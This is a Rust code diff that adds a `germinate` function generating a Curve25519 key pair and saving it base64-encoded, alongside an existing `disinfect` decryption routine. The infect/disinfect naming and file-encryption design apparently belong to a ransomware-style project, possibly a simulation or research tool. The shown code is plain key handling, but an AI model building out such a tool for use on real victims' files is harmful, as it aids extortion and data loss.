@@ -3,8 +3,8 @@
 
 use std::{
     collections::HashSet,
-    fs,
-    io::{self, ErrorKind},
+    fs::{self, File},
+    io::{self, ErrorKind, Write},
     path::Path,
 };
 
@@ -12,7 +12,10 @@ use log::{debug, info};
 use walkdir::WalkDir;
 
 use crate::{
-    crypto::{EXTENSION, decrypt, encrypt, load_private_key, load_public_key},
+    crypto::{
+        EXTENSION, b64_decode, b64_encode, decrypt, encrypt, generate_keypair, load_private_key,
+        load_public_key,
+    },
     error::AppError,
 };
 
@@ -223,5 +226,49 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppErr
     }
 
     info!("Decryption process completed successfully");
+    Ok(())
+}
+
+/// Takes a path, generates a Curve25519 key pair, and saves the private and
+/// public keys into the path.
+///
+/// # Arguments
+/// - `path`: The path to save the generated key pair named
+///   `main-private.key` and `main-public.key`.
+///
+/// # Returns
+/// A `Result` with a unit type on success of an AppError if the routine fails.
+pub fn germinate(path: &Path) -> Result<(), AppError> {
+    if !path.exists() || !path.is_dir() {
+        return Err(AppError::Io(io::Error::new(
+            io::ErrorKind::NotFound,
+            format!("Path not found or not a directory: {:?}", path),
+        )));
+    }
+
+    let (private_key_bytes, public_key_bytes) = generate_keypair()?;
+
+    let private_key_b64 = b64_encode(&private_key_bytes);
+    let private_key_path = path.join("main-private.key");
+
+    let public_key_b64 = b64_encode(&public_key_bytes);
+    let public_key_path = path.join("main-public.key");
+
+    let mut file = File::create(&private_key_path)?;
+    file.write_all(private_key_b64.as_ref())?;
+    info!("Main private key saved to: {:?}", private_key_path);
+
+    let mut file = File::create(&public_key_path)?;
+    file.write_all(public_key_b64.as_ref())?;
+    info!("Main public key saved to: {:?}", public_key_path);
+
+    // Making sure the encoded keys are valid
+    if let Ok(prikey) = b64_decode(&private_key_b64) {
+        assert_eq!(private_key_bytes, prikey);
+    }
+    if let Ok(pubkey) = b64_decode(&public_key_b64) {
+        assert_eq!(public_key_bytes, pubkey);
+    }
+
     Ok(())
 }
